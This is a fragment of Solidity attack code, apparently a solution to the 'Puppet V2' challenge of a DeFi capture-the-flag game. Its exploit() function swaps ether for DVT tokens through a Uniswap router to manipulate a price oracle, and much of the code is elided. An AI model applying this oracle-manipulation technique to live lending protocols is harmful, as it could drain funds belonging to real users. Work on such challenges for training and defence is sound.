...
contract PuppetV2Attacker {
    ...
    IERC20 weth = IERC20(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    ...
    function exploit() public {
        ...
        // Now, swap all the ether in this contract for DVT tokens, and then
        // swap all the DVT tokens in this account to WETH
        path[0] = address(weth);
        path[1] = address(token);

        uniswapRouter.swapExactETHForTokens{
            value: address(this).balance - 1 ether
        }(1, path, address(this), block.timestamp * 5);
